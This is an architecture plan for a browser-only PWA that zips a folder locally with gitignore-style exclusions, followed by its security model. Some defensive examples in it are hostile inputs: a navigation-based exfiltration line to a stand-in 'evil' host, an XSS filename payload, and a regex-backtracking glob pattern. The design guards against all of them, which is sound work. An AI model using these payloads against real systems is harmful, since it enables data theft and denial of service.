# Packlight: Architecture Plan

## 1. Recommendation

Build a **static Progressive Web App (PWA)**: plain HTML, CSS and JavaScript, hosted free on **GitHub Pages**, the same way your friend's timetable is (as a free organization site, so the app has a web origin to itself; §8). It installs to a phone or desktop home screen and works offline after the first visit.

- **Everything runs in your browser.** The folder is read on your device, zipped on your device and saved on your device. There is no server, no upload, no account and no database.
- **Exclusions use real `.gitignore` rules.** You pick patterns like `venv/`, `.settings/` and `*.log` from a searchable dropdown as removable chips. The app also honors any `.gitignore` files inside the folder. Excluded folders are **skipped before they are read**, so a 40,000-file `venv` costs nothing.
- **One small dependency:** `fflate` (MIT licence) writes the ZIP. Browsers have no built-in way to create a ZIP file. The library file is copied into the repo, so nothing loads from a CDN.

### Why this option

| Option | Free | Offline | Phone app like the timetable | Verdict |
|---|---|---|---|---|
| **Static PWA on GitHub Pages** | Yes | Yes, after first visit | Yes | **Chosen** |
| Desktop app (Electron/Tauri) | Code signing for macOS/Windows costs money | Yes | No | Heavy, per-OS builds |
| Python script / CLI | Yes | Yes | No | Not user-friendly |
| Server web app (upload → zip) | Hosting costs | No | Partly | Uploads private files, so it fails the security goal |

### The pattern this design copies

This problem has already been solved by **Docker's build context**. Before a build, the Docker CLI walks a folder, applies `.dockerignore`, skips excluded directories without reading inside them, streams an archive, and prints `Sending build context… 1.2GB`. That size line is how people notice they forgot to ignore `node_modules`. Four ideas carry over directly:

1. An ignore-pattern file plus sensible defaults.
2. Prune excluded directories before descending into them.
3. Stream the archive out instead of holding it in memory.
4. Show what will be packed (file count and size) before packing.

The analogy breaks in a few places, and each break needs its own fix:

| Where the analogy breaks | Fix in this design |
|---|---|
| Docker has full disk access. A web page can read a folder only after the user picks it, and each browser exposes a different API for that. | Three small "folder adapters" feed one shared walker (§5). |
| `.dockerignore` uses Go glob rules (anchored at the root, no "match this name anywhere"). You asked for gitignore. | Implement gitignore semantics (§6). `venv/` then matches at any depth, as users expect. |
| Docker's ignore file is trusted, because you wrote it. Here, a `.gitignore` inside a downloaded repo is untrusted input. | The matcher uses no regex and runs in guaranteed linear-ish time (§6), so a hostile pattern cannot hang the tab. |
| Docker can re-include files inside an excluded folder. Git cannot. | Follow git. This is simpler, and it is what makes pruning safe. |
| Docker reads its context once per build. Here the rules change while you watch the preview. | Compress is enabled only after the walk for the current rules has finished (§5). |
| Tar streams trivially. ZIP needs a CRC per file and a central directory at the end. | `fflate`'s streaming `Zip` handles this with data descriptors. |
| Tar keeps Unix permissions and symlinks. Browsers expose neither. | Documented limitation (§10). |
| Docker contexts have no size cap. `fflate` writes no ZIP64. | Hard guard: total under 4 GiB and at most 65,535 entries (§10). |

## 2. Assumptions

- "Functionality for gitignore" means two things: (a) the exclusion patterns use gitignore syntax, and (b) the folder's own `.gitignore` files are honored. A toggle controls (b) and is **on** by default.
- "No storage" means no database, cookies, `localStorage` or saved folder access. The only thing the browser keeps is the app's own code (the offline cache). Offline use is impossible without it, and it contains none of your data. As a result, your chip choices reset on every launch. The defaults cover the common cases.
- The input is exactly **one folder**. The ZIP is named `<folder>.zip` and contains the folder itself as its top-level entry, the same as the "Compress" command in macOS and Windows.
- Pattern matching is **case-insensitive** (`venv/` also excludes `Venv/`). This matches git's default on macOS and Windows (§6).
- Desktop is the main use, because that is where project folders with `venv` live. Phones are supported where the browser allows (§10).

## 3. File structure (whole repo)

```
packlight/
├── index.html            markup, CSP, manifest link
├── style.css             all styling, light + dark
├── app.js                UI, folder adapters, walker, zipping, saving (ES module)
├── ignore.js             gitignore pattern → matcher (pure, no DOM, no RegExp)
├── ignore.test.mjs       assert-based self-check: `node ignore.test.mjs` (Node 22.7+ or 20.19+)
├── fflate.js             vendored fflate 0.8.3 `esm/browser.js`, unmodified
├── sw.js                 service worker (offline cache), must be its own file
├── manifest.webmanifest  install metadata
├── icon-192.png
├── icon-512.png
└── README.md             how to use, how to deploy, fflate version + SHA-256, minimum Node for the self-check
```

There are **11 files, no build step, no npm and no framework.** `ignore.js` is split from `app.js` only so the matcher can be tested without a browser.

## 4. UI layout (single screen, single column)

```
┌──────────────────────────────────────────────┐
│  🗜  Packlight                               │
├──────────────────────────────────────────────┤
│  ┌────────────────────────────────────────┐  │
│  │   📁  Choose a folder                   │  │  ← <button>; also a drop zone on desktop
│  │       or drop it here                   │  │
│  └────────────────────────────────────────┘  │
│                                              │
│  Exclude                                     │
│  [ Search or type a pattern…   ]  [Add]      │  ← <input type=search>
│  ┌ .venv/  ·  venv/  ·  env/  ·  .vscode/ ┐  │  ← suggestion list (buttons), filtered
│  └ 3 more, keep typing…                   ┘  │     as you type; shown while focused
│  (venv/ ×·1) (.git/ ×·1) (node_modules/ ×)   │  ← chips, with match counts after scan
│  (__pycache__/ ×·12) (.DS_Store ×) (.env* ×·2)│
│  ☑ Also use this folder's .gitignore (3 rules)│
│                                              │
│  my-project → 214 files · 3.1 MB             │  ← preview; "Updating…" while re-walking
│  Skipped: venv/, .git/, 12 × __pycache__/ …  │  ← expandable <details>
│                                              │
│  [        Compress to my-project.zip       ] │  ← primary; disabled until preview is current
│  ▓▓▓▓▓▓▓▓▓░░░░░  62%  src/utils/io.py [Cancel]│  ← <progress> + aria-live status
│  ✓ Saved my-project.zip (1.2 MB)             │  ← save-dialog path (Chromium)
│     — or, on the in-memory path —            │
│  ✓ my-project.zip ready (1.2 MB)             │
│  [ ⬇ Save ZIP ]  [ ⇪ Share… ]                │  ← second tap = fresh user gesture
└──────────────────────────────────────────────┘
```

**The searchable multi-select dropdown** is an `<input type="search">` with a small suggestion list directly under it: a `<div>` of `<button type="button">` elements, rebuilt on every `input` event (about 25 lines of JS, no library). Each chip has a × remove button, so you can add as many as you like.

*Why not `<datalist>`:* it would be fewer lines, but its dropdown **does not appear at all on Firefox for Android** (MDN marks it partial, bug 1535985). Its look can't be styled, and a pick can only be told apart from typing through per-browser `inputType` quirks. A plain list of buttons works the same everywhere.

How it behaves:

- **Shown** while the input has focus. It shows all suggestions in a scrollable panel (`max-height`) when the box is empty, and only matches as you type. Matching is a case-insensitive `includes`. Chips you already have are hidden from the list. **Hidden** on `Escape`, or on `focusout` when focus leaves both the input and the list.
- **Clicking or tapping a suggestion adds that chip at once,** then clears the box and returns focus to it. Only an explicit click adds a chip, so typing `build-notes` can never turn into a `build/` chip.
- **The list keeps focus where it is while you click it:** one listener, `list.addEventListener('mousedown', e => e.preventDefault())`. Safari (macOS and iOS) and Firefox on macOS do **not** focus a `<button>` when it is clicked or tapped (MDN, `<button>` "Clicking and focus"). Without this line the input would lose focus on mousedown with `relatedTarget === null`, the `focusout` rule above would hide the list, and the click would land on nothing, so no chip would be added on iPhone. Preventing the mousedown default stops that focus change in every browser (taps fire a compatibility `mousedown` too), and the `click` still fires. It also means `focusout` only ever sees real moves: keyboard focus going into the list, or focus leaving the widget.
- **Typing any pattern, then pressing Enter or Add,** adds exactly what you typed.
- **Keyboard:** `↓`/`↑` move focus through the input and the suggestions with `button.focus()` (about 6 lines), and `Enter`/`Space` press the focused one. Arrow keys are used rather than relying on `Tab`, because Safari on macOS skips buttons on `Tab` by default; programmatic `focus()` works on buttons in every browser. `Tab` still works where the browser tabs to buttons. These are native buttons, so screen readers announce each one as a button ("venv/, button") with no ARIA combobox code. The match count ("4 suggestions") is announced through the existing `aria-live` status.
- The input has `autocorrect="off" autocapitalize="off" spellcheck="false"`, because patterns are not prose.

The suggestion list holds:

- **Presets:** `venv/`, `.venv/`, `env/`, `__pycache__/`, `*.pyc`, `.pytest_cache/`, `.mypy_cache/`, `.ipynb_checkpoints/`, `node_modules/`, `dist/`, `build/`, `.next/`, `target/`, `.gradle/`, `.git/`, `.idea/`, `.vscode/`, `.settings/`, `.project`, `.classpath`, `.DS_Store`, `Thumbs.db`, `.env*`, `!.env.example`, `*.pem`, `*.key`, `*.log`, `coverage/`, `.cache/`.
- **This folder's own top-level names,** added after you pick a folder, so you can search your real contents ("tmp_data/").

**Chips selected by default:** `.git/`, `venv/`, `.venv/`, `node_modules/`, `__pycache__/`, `.DS_Store`, `.env*`. `.env*` is on by default because these files usually hold secrets, and it catches every variant: `.env`, `.env.local`, `.env.production.local` (the files Next.js and Vite document for local secrets), and `.envrc`. The template `.env.example` is normally meant to be shared, so it is in the suggestion list as `!.env.example`: one tap re-includes it, because later chips win (§6). Remove the `.env*` chip if you want all of them in the ZIP.

**Chip input validation:** trim whitespace, ignore blank input and duplicates (compared case-insensitively, matching §6), and cap length at 200 characters. Refuse a pattern that `compile` marks invalid (for example an unterminated `[`) and show "Invalid pattern" next to the box (§6).

**Design:**
- System font stack and one accent colour, defined as CSS variables.
- Light and dark themes via `prefers-color-scheme`.
- Large tap targets of at least 44 px and a visible focus ring.
- `<label>` on every control. The status line uses `aria-live="polite"`.
- No inline styles. Progress uses the native `<progress>` element.

## 5. Data flow

```
 pick / drop folder
        │
        ▼
 ┌─────────────── adapter (one of three) ─────────────┐
 │ A showDirectoryPicker({mode:'read'})  → handles      │
 │ B drop: DataTransferItem.webkitGetAsEntry() → entries │
 │ C <input type=file webkitdirectory> → FileList→tree  │
 └──────────── all expose: dir.list() → [{name, kind, getFile(), dir}] ┘
        │
        ▼
 WALK (shared, recursive)  walk(dir, relPath, rules)   (rules = what applies here; never mutated)
   for each dir: list children → if a .gitignore is present and the toggle is on,
                 childRules = [...rules, ...compile(lines, relPath)]   (a NEW array, passed only
                 down into this dir's subtree, so siblings and parents never see these rules)
   for each child: isIgnored(path, isDir)?  yes → record in "skipped", DON'T descend
                                            no  → dir: recurse; file: push {path, getFile, size, mtime}
        │
        ▼
 PREVIEW  file count · total size · skipped list · per-chip match counts
          guards: >65,535 entries or ≥ 3.9 GiB → block with message
                  no showSaveFilePicker (in-memory path) and total > MEM_CAP → block with message (§10)
        │   (chip/toggle/folder change → gen++ → Compress disabled, preview "Updating…",
        │    any finished in-memory ZIP discarded: Save/Share hidden, URL revoked
        │    → re-walk, debounced 300 ms; adapter C re-filters its in-memory tree)
        │   Compress is enabled only when walk.gen === gen and no guard blocks
        ▼
 COMPRESS  (on button click; zips the frozen file list of walk `gen`;
            chips, toggle and folder picker are disabled until the job ends)
   1. FIRST action in the click handler: showSaveFilePicker() if available → writable
      (it needs the user's click, and that permission expires after long awaits)
   2. zip = new fflate.Zip(onChunk)
   3. per file: PROBE first: try { file = await getFile()     (fresh, at compress time)
                                     reader = file.stream().getReader(); first = await reader.read() }
                  catch → skip this file, add it to the "couldn't be read" list, continue
                then:  entry = new ZipDeflate('<root>/<path>', {level: 6}); entry.mtime = clampMtime(file.lastModified)
                zip.add(entry)
                if first.done (0-byte file: __init__.py, .gitkeep, py.typed):
                     entry.push(new Uint8Array(0), true)          (value is undefined; never push it)
                else push first.value, then each remaining chunk → entry.push(chunk);
                     when the reader is done → entry.push(new Uint8Array(0), true)
                await pending writes after each chunk (keeps memory flat); update <progress>
      empty included dirs → ZipPassThrough('<root>/<dir>/') pushed empty+final
   4. zip.end()
        │
        ▼
 SAVE  A/streaming: chunks → writable.write(); writable.close()   (no extra tap: the dialog
                    was opened in step 1, while the click was fresh)
       otherwise:   chunks → array; every 32 MB fold them: parts.push(new Blob(chunks)); chunks = []
                    (the raw arrays are freed, so peak RAM is ≈ output size, not twice it)
                    → file = new File(parts, '<folder>.zip', {type:'application/zip'})
                    → reveal [Save ZIP] = real <a download href=URL.createObjectURL(file)>
                    → reveal [Share…] only if navigator.canShare?.({files:[file]})
                         onclick: navigator.share({files:[file]})  (iPhone: "Save to Files")
                    → the ZIP is tagged with the `gen` it was built from. Whenever gen++ happens
                      (any chip, toggle or folder change) or a new job starts: hide Save/Share,
                      URL.revokeObjectURL(), drop `file`. A saved ZIP always matches the preview.
```

**Why Compress waits for the walk:** the preview is the user's check that nothing secret is included (§8). If Compress could run on the previous walk's list, adding the chip `secrets/` and clicking at once would still zip `secrets/`. A generation counter (`gen`) is incremented on every rule, toggle or folder change. Each walk is tagged with the `gen` it started under, and a walk whose tag is out of date is thrown away when it finishes. The button is enabled only when the latest finished walk matches the current `gen`. Because the button is disabled until then, the click handler can still open the save dialog as its very first action (step 1). A long walk does not get in the way of the user's gesture.

The same guard covers the **in-memory path's Save ZIP / Share… buttons**. Those appear after the job ends, when the chips are unlocked again. If the user then spots `secrets/api.txt` in the preview and adds the chip `secrets/`, the finished ZIP no longer matches the rules. So the single function that does `gen++` also hides Save/Share, revokes the object URL and drops the `File`; the status changes to "Rules changed. Compress again." Putting it in the one `gen++` function means no rule-changing control can forget it. (The streaming path has nothing to discard: its ZIP was written to disk during the job, under the rules that were frozen for it.)

**Why each file is probed before `zip.add()`:** in fflate 0.8.3, `Zip.add()` writes the entry's local header at once and registers the entry, and there is no way to take it back. A read error from `file.stream()` only appears on the first `read()`. If the app added first and read second, every unreadable file would corrupt the archive, and "skip it" would be impossible. So the app re-gets the `File` (adapters A and B call `getFile()`/`file()` again, so a file saved in an editor since the preview is read fresh) and pulls its first chunk. Only a file that delivers that chunk is added. Typical cases this saves:
- A OneDrive, iCloud or Dropbox "online-only" placeholder while offline. Its read fails, so it is skipped and listed, and the rest of the ZIP is made.
- A file deleted since the preview (`NotFoundError`).
- On adapter C, a file changed since it was picked (Chromium throws `NotReadableError` for a stale snapshot).

A 0-byte file passes the probe with `first.done === true` and no `value`; it is added and closed with one empty final push, never `push(undefined)`, which would throw inside fflate after the entry is already written. A small file usually arrives as one chunk (chunk sizes vary by browser, typically tens of KiB), so for most files the probe *is* the whole read. Only a failure after the first chunk of a large file still aborts the job (§9). There, the entry is half-written and cannot be removed.

**Why the in-memory path needs a second tap:** `navigator.share()` requires transient user activation, and Safari may also block a script-triggered download that runs long after the click. Zipping takes seconds, so the Compress tap's activation has expired by the time the ZIP exists. A visible **Save ZIP** link, plus **Share…** where file sharing is supported, makes the user's own tap the gesture. This works in Safari tabs, installed iPhone home-screen apps, Firefox and Android alike, without guessing per platform. `AbortError` from a dismissed share sheet is ignored.

### Adapter details that often break, and how to handle each

- **A (Chromium desktop and Android):** walk with `for await (const [name, h] of dir.entries())`. Get size and mtime from `await h.getFile()`.
- **B (drag-and-drop, all desktop browsers):**
  - **Exactly one folder is accepted.** If `dataTransfer.items.length !== 1`, or the single entry is not `isDirectory` (a plain file), nothing changes and the status says "Drop one folder." Dropping several folders would make the ZIP's name and root folder ambiguous, so the app refuses rather than guesses. Adapters A and C can only ever return one folder.
  - Call `webkitGetAsEntry()` **synchronously inside the `drop` handler**, before any `await`. Otherwise the items are gone.
  - `readEntries()` returns entries in batches (100 at a time in Chrome). **Call it in a loop until it returns an empty array**, or large folders get silently truncated.
  - `fileEntry.file()` uses callbacks. Wrap it in a Promise.
  - **Assumption: dropped entries stay readable after the `drop` event ends.** Every chip change re-walks the dropped `FileSystemDirectoryEntry` later, and Compress reads its files later still. The File and Directory Entries spec ties these entries to the drop and says nothing about expiry after the event, and Chromium keeps them readable. Safari and Firefox are **not verified** here. §11 has a test for it. **Fallback, so the app can never get stuck on "Updating…":** any error from a walk (`readEntries`/`file()` failing, or a folder moved or deleted on adapter A) ends that walk. The preview then shows "Couldn't re-read the folder. Drop or choose it again." and Compress stays disabled until a new folder is given. If Safari or Firefox fails the test, the fix is to keep adapter B's first walk as an in-memory tree and re-filter it, like adapter C. That works because the first walk under the default chips has already read everything *not* excluded, and a later chip can only narrow it. Removing a default chip or turning the `.gitignore` toggle off widens the set, so that would need the re-drop.
- **C (fallback):**
  - The browser enumerates the whole folder, `venv` included, before the app sees anything, so pruning is impossible here. Excluding still works.
  - Build a nested tree from each file's `webkitRelativePath` so the same walker runs on it. Because the walker checks every directory on the way down, `venv/` correctly removes `venv/lib/…/x.py` even though the input list contains only files.
  - Chromium shows an "Upload N files to this site?" prompt for this input. Nothing is uploaded. A hint under the button says so.

**Zip entry names** are path components joined with `/`, prefixed with the folder name. Any component equal to `.` or `..`, or containing `/` or `\`, is rejected (skipped and reported). That rule makes "zip-slip" archives impossible. fflate sets the UTF-8 flag automatically for non-ASCII names.

**Timestamps:** fflate throws on dates outside 1980–2099, which DOS time in ZIP cannot store. It checks the year in **local** time (`new Date(mtime).getFullYear()`), so the clamp must use local-time bounds too:

```js
// local-time bounds; a UTC floor would land in 1979 for timezones west of UTC
const clampMtime = t => Math.min(Math.max(t, new Date(1980, 0, 2).getTime()), new Date(2099, 11, 30).getTime());
```

The one-day margin on each side absorbs DST and offset edge cases. Without the clamp, one file with a 1970 date would crash the whole job.

## 6. Exclusion rules (`ignore.js`)

`ignore.js` exports `compile(lines, base) → rules[]` and `isIgnored(rules, path, isDir) → boolean`. Each line follows the gitignore rules:

| Line | Meaning |
|---|---|
| blank, or starts with `#` | ignored (`\#` and `\!` escape a literal `#` or `!`) |
| trailing spaces | trimmed (unless escaped `\ `) |
| `!pattern` | re-include (negation) |
| `pattern/` | matches directories only |
| contains `/` at start or middle | anchored to the folder of the `.gitignore` it came from (the chosen folder, for chips). A leading `/` is stripped. |
| no `/` (except trailing) | matches the name at any depth |
| `*`, `?`, `[a-z]` / `[!a-z]` | within one path segment, as in git (`*` and `?` never match `/`) |
| leading `**/x`, middle `a/**/b` | `**` matches **zero or more** segments (`**/foo` matches `foo`, and `a/**/b` matches `a/b`) |
| trailing `x/**` | matches everything **inside** `x`, so **one or more** segments. It does *not* match the directory `x` itself, so `x` is still walked and `!x/.gitkeep` can re-include a file inside it |
| `**` not a whole segment (e.g. `a**b`) | treated as a single `*`, as in git |
| letter case | **case-insensitive**: `thumbs.db` matches `Thumbs.db`, and `*.log` matches `ERROR.LOG` (see below) |
| unterminated `[` (e.g. `foo[1`) | **invalid**: the rule never matches, as in git's wildmatch (see below) |

**Scope:** every rule remembers its `base`, the folder its `.gitignore` sits in (`''` for chips and the root file). **A rule from `sub/.gitignore` applies only to paths under `sub/`, whether or not it contains a slash**, exactly as in git. This is enforced twice, so neither layer can be got wrong alone: the walker passes a new rules array down only into that folder's subtree (§5), and `isIgnored` skips any rule whose `base` is not a prefix of the path being tested. This matters in practice: `python3.13 -m venv myenv` writes `myenv/.gitignore` containing `*`. That must empty `myenv/` (which is what the venv author intends) and must not touch `src/` or `README.md` beside it.

**Precedence:** the rules that apply to a path are evaluated in walk order, root first, so deeper files override shallower ones. **Chips come last, so they win.** That matches git, where command-line patterns beat `.gitignore`. Typing the chip `!dist/` therefore re-includes a `dist/` that the project's `.gitignore` excludes. The last matching rule decides. If a directory is excluded, nothing inside it can be re-included. This is git's rule, and it is what makes pruning correct.

**How matching works: no RegExp, by design.** A `.gitignore` from a cloned repo is untrusted input, and translating globs to regexes is unsafe. `*a*a*a*a*a*a*a*b` becomes `[^/]*a[^/]*a…`, which backtracks exponentially in V8: about 1.2 s against a 40-character name, and each extra `*a` multiplies that. Length caps don't help, because the attack fits in 22 characters. Instead:

- `compile` splits each pattern on `/` into segments. Each segment becomes a token list: literal char, `?`, `*`, or a class `[…]` (`\x` escapes, `!`/`^` negation, `a-z` ranges). `**` stays a segment-level wildcard (zero or more segments). A **trailing** `**` compiles to two segments, "any one segment" (a `*` segment) followed by `**`. That gives "one or more" without a second wildcard kind in the matcher.
- **Case folding:** literal tokens are lowercased at compile time, and each name is lowercased once before matching. A class tests both `c.toLowerCase()` and `c.toUpperCase()`, so `[A-Z]` still matches `a`. This copies git's `core.ignorecase=true`, which is the default on macOS and Windows, the main desktop platforms, and it errs toward excluding (the safe side for secrets).
- `isIgnored` runs **one ~15-line greedy wildcard matcher twice**: over characters inside a segment (wildcard `*`), and over path segments (wildcard `**`, where each item comparison is the segment match). On a mismatch it backtracks only to the **last** star, never further. Worst case is O(pattern length × name length) with no exponential blow-up. A prototype ran a 31-character hostile pattern against a 5,000-character name in 1 ms.
- Patterns without a `/` are matched against the entry's own name, because the walker tests every directory on the way down. Anchored patterns are matched against the path relative to the `.gitignore`'s folder.
- **Invalid patterns cannot throw.** There is no `new RegExp`, so there is nothing to throw. An unterminated `[` makes `compile` mark the rule invalid, and an invalid rule never matches. Invalid `.gitignore` lines are skipped and counted next to the toggle ("3 rules, 1 ignored: invalid"). Invalid chips are refused (§4).
- Sanity caps remain only to bound memory: lines over 1,000 characters and files over 5,000 rules are skipped with a message.

**Self-check (`ignore.test.mjs`)**, using `node:assert`. Run it with `node ignore.test.mjs`. Minimum cases:
- `venv/` excludes `venv` and `a/venv`, but not a *file* named `venv`.
- `/build` excludes `build` but not `src/build`.
- `*.pyc` excludes `x.pyc` and `a/b/x.pyc`.
- `*.log` followed by `!keep.log` keeps `keep.log`.
- `docs/**/*.md` excludes `docs/a/b/c.md` and `docs/c.md` (zero middle segments), but not `docs.md`.
- `**/foo` excludes `foo` and `a/b/foo`.
- `logs/**` does **not** match the directory `logs`, but excludes `logs/x.txt` and `logs/sub`. `logs/**` followed by `!logs/.gitkeep` keeps `logs/.gitkeep` and drops `logs/x.txt` (the usual "keep an empty folder" idiom).
- `thumbs.db` excludes `Thumbs.db`, `*.log` excludes `ERROR.LOG`, and `[A-Z]*.tmp` excludes `a.tmp`.
- `\#notes` matches a file literally named `#notes`.
- In a nested `sub/.gitignore`, `/out` excludes `sub/out` but not `out`.
- **Un-slashed nested rules stay in their folder:** with `myenv/.gitignore` = `*`, `myenv/bin/python` is excluded but `src/main.py` and `README.md` are kept. With `a/.gitignore` = `*.log`, `a/x.log` is excluded and `b/x.log` is kept.
- A chip `!dist/` overrides a `.gitignore` line `dist/`.
- `*.py[co]` excludes `x.pyc`, and `[!a]b` does not exclude `ab`.
- `foo[1` compiles without throwing, is flagged invalid, and matches nothing.
- `.env*` excludes `.env`, `.env.local` and `.ENV`. Followed by `!.env.example`, it keeps `.env.example`.
- **Hostile-input timing:** `'*a'.repeat(15) + '*b'` against `'a'.repeat(5000)` returns `false` in under 50 ms. This fails loudly if someone reintroduces a backtracking regex.

## 7. Offline and install

- **`manifest.webmanifest`:**
  - `name` "Packlight", `start_url` `"./"`, `scope` `"./"`, `display` `"standalone"`, plus `theme_color` and `background_color`.
  - Icons: 192 and 512 px PNGs with `"purpose": "any"`, plus the 512 listed again with `"purpose": "maskable"`. Draw the artwork inside the central 80% of the image.
  - `index.html` also has `<link rel="apple-touch-icon" href="icon-192.png">` for iOS.
- **`sw.js` (about 30 lines). The app's files are refreshed as one set, at launch, and are always served from that set.** It holds one list, `FILES = ['./', 'index.html', 'style.css', 'app.js', 'ignore.js', 'fflate.js', 'manifest.webmanifest', 'icon-192.png', 'icon-512.png']`, and one cache, `packlight`.
  - **`install`:** fetch every file in `FILES` as `new Request(url, {cache: 'reload'})`, so GitHub Pages' 10-minute HTTP cache (`max-age=600`) can't feed in stale files, and store them all. Then call `self.skipWaiting()`.
  - **`activate`:** call `self.clients.claim()`, so the new worker controls open windows at once.
  - **`fetch`, navigation requests** (`request.mode === 'navigate'`, i.e. opening the app): run `refresh()`. It fetches **all** of `FILES` with `{cache: 'no-cache'}`, which is a cheap ETag revalidation (usually `304`) and never a stale HTTP-cache hit. **Only if every response is `ok`** does it `cache.put` all of them, and only **after** that does it answer the navigation from the cache (`caches.match(request, {ignoreSearch: true})`, else `caches.match('./')`). If any fetch fails or is not `ok` (offline, flaky connection, a half-finished deploy), nothing is written and the navigation is answered from the cache, which still holds the previous complete set. If the cache somehow has no copy, fall back to the network.
  - **`fetch`, everything else** (same-origin GET only): `caches.match(request)`, falling back to `fetch(request)`. The page's modules therefore always come from the one set that `refresh()` finished writing before the page started loading.
  - **Why this shape:** two failure modes are ruled out.
    - **Mixed versions.** Per-request network-first can mix module versions: a new `app.js` arrives, the `ignore.js` request fails, and the old cached copy is served, so the import breaks with "does not provide an export named…". Here no file is replaced unless all of them were fetched.
    - **Stale code from a forgotten bump.** Cache-first with a hand-bumped `v1`/`v2` pins users to old code whenever a bump is forgotten. Here every online launch revalidates. **There is no version number to remember.** Changing `FILES` changes `sw.js`, and the browser reinstalls a changed `sw.js` by itself.
  - An already-open window keeps running the code it loaded. The new set takes effect on the next launch.
  - *Known ceilings:* (1) The writes in `refresh()` are not one transaction. If the browser is killed midway through them, the cache can hold a mix until the next successful online launch repairs it. That window is milliseconds. Upgrade path: write into a fresh `packlight-<timestamp>` cache, then delete the old one. (2) On a connection that hangs instead of failing ("lie-fi"), launch waits for the network timeout. Upgrade path: race `refresh()` against a 3-second timer and serve the cached set if it loses.
- **Relative URLs everywhere** (`./sw.js`, `./app.js`). The recommended host is an organization site at the root of its own origin (§8, §11), but relative URLs also keep the app working as a project site at `https://<you>.github.io/<repo>/`, where absolute `/app.js` paths would break, so the hosting choice never touches the code.
- **Installing:** on Android or desktop Chrome/Edge, use the browser menu → *Install app*. On iPhone, use Safari → Share → *Add to Home Screen*. A one-line hint in the footer says this. There is no custom install button.

## 8. Security model

| Threat | Control |
|---|---|
| Files leave the device | **Primary control: only trusted code runs.** The app's own code makes no network requests with user data, and the only other code is the pinned, hash-checked `fflate.js` (next row). **Second layer: a CSP `<meta>`**, `default-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'`. It stops scripts loading from other origins and blocks `fetch`/XHR/WebSocket/beacon/image requests to them. **It does not stop top-level navigation** (`location.href = 'https://evil/?d=…'`, `window.open`). The `navigate-to` directive that would have covered this was dropped from CSP and no browser ships it. So the CSP limits the damage of an injected script but is not a guarantee against a tampered library. That is why the library is vendored and hash-checked rather than trusted. The service worker caches only the app's own files. |
| Malicious or changed third-party code | No CDN. `fflate.js` is vendored at a pinned version. Its SHA-256 is recorded in the README (fflate 0.8.3 `esm/browser.js`: `b7ca4450b19559a1d50eb381adcee94b82449674be4cd17789d9beba7e6122a1`). Re-check it whenever you upgrade. There is no npm install and no build pipeline. |
| XSS through a crafted filename (`<img onerror=…>.txt`) | File names are only ever written with `textContent` or `createElement`. **`innerHTML` is never used.** The CSP's lack of `'unsafe-inline'` blocks injected scripts even if this slips. |
| Writing to or damaging the source folder | Folders are opened with `mode: 'read'`. The app has no code path that writes to the source folder. The ZIP goes only where you choose in the save dialog, or to Downloads. |
| Lingering access to your files | Folder handles live only in memory for the current tab. They are never saved to IndexedDB, so closing the tab revokes access. |
| Zip-slip / path traversal in the produced archive | Entry names are built from validated components only (§5). |
| Secrets accidentally zipped | `.env*` is excluded by default, so `.env`, `.env.local` and `.env.production.local` are all caught, and matching is case-insensitive, so `.ENV` is caught too. `*.pem` and `*.key` are one tap away in the suggestions. This works even when the project has no `.gitignore` or the toggle is off. The preview shows exactly what will be included. Compress is disabled until the preview matches the current rules, so a just-added exclusion can't be bypassed by clicking quickly, and a finished in-memory ZIP is discarded (Save/Share hidden) the moment any rule changes, so an older ZIP can't be saved after a new exclusion (§5). |
| Hostile `.gitignore` freezing the tab (regex blow-up) | **No RegExp at all.** A greedy wildcard matcher with last-star backtracking runs in O(pattern × name) worst case. A timing assertion in `ignore.test.mjs` guards it (§6). |
| Malformed pattern crashing the walk (e.g. `foo[1`) | The matcher has no throwing code path. The invalid rule never matches and is reported (§6). |
| Stale or mixed app code after an update | The service worker refreshes all files as one set at launch, writing only if every file was fetched, and serves modules only from that set (§7). |
| Tampered hosting | GitHub Pages serves over HTTPS only (enable "Enforce HTTPS"). Protect the GitHub account with 2FA, since whoever controls the repo controls the app. |
| Another site on the same origin rewriting the offline cache | CacheStorage, IndexedDB and service-worker caches are **per origin, not per path**. Every project site of one account shares `https://<you>.github.io`, so a page in any *other* Pages repo of that account (say, one that loads a third-party script) could run `caches.open('packlight')` and replace `app.js`; the service worker would then serve it offline. **Fix: give the app an origin of its own, for free.** Create a free GitHub organization used only for this app (e.g. `rish-packlight`) and name the repo `rish-packlight.github.io`. It is served at `https://rish-packlight.github.io/`, an origin no other repo shares as long as that organization hosts no other Pages sites (§11). The trust boundary is then exactly this one repo. |
| Clickjacking | GitHub Pages cannot send `frame-ancestors` or `X-Frame-Options` headers, and a meta CSP cannot set `frame-ancestors`. `app.js` therefore starts with `if (window.top !== window) { document.body.textContent = 'Open Packlight directly.'; throw 0; }`. The impact is low regardless, because a framing site cannot read your files. |

This design does not store your data, so there is nothing to leak at rest.

## 9. Error handling

- **Picker cancelled** (`AbortError`): do nothing. **Folder blocked by the browser** (Chrome refuses system folders and the home-folder root; Android refuses the storage root and the `Download` folder itself, but subfolders work): show "Choose a subfolder instead."
- **A file disappears, can't be opened, or fails on its first chunk** (deleted, online-only cloud placeholder while offline, stale snapshot): it is caught by the probe *before* `zip.add()` (§5), skipped, and listed in a yellow "N files couldn't be read and were not included" panel with their paths. The ZIP is still made. Nothing is skipped silently.
- **A large file fails after its first chunk:** its entry is already in the archive and fflate cannot remove it, so **abort the whole job** and name the file. The message says: "Try again, or add an exclusion chip for this file." On the streaming path, call `writable.abort()` so a broken ZIP is never committed. (An empty placeholder file may remain where you chose to save.)
- **Cancel button:** an `AbortController` is checked between chunks, with the same abort behaviour.
- **Feature detection, never browser sniffing:** `'showDirectoryPicker' in window`, `'showSaveFilePicker' in window`, `'webkitdirectory' in HTMLInputElement.prototype`. If none is available, show "This browser can't open folders" and name the browsers that can.

## 10. Known limitations and how each is handled

Browser support was checked against MDN compatibility data (Oct 2026):

| Platform | Pick folder | Skips `venv` without reading it | How the ZIP is saved |
|---|---|---|---|
| Chrome / Edge / Opera desktop (86+) | Button (A) or drop (B) | Yes | Save dialog, streamed to disk |
| Chrome Android (132+) | Button (A) | Yes | Save dialog, streamed to disk |
| Firefox / Safari desktop | Drop (B) or button (C) | Drop: yes. Button: no. | Download, built in memory |
| Safari iOS (18.4+), Firefox Android (142+) | Button (C) | No | Download, built in memory |

| Limitation | Handling |
|---|---|
| **No ZIP64 in fflate** (it only reads ZIP64). Above 4 GiB or 65,535 entries, the output would be corrupt. | The preview blocks the job if the included total reaches 3.9 GiB or there are more than 65,535 entries (files plus empty-folder entries). The message suggests more exclusions. |
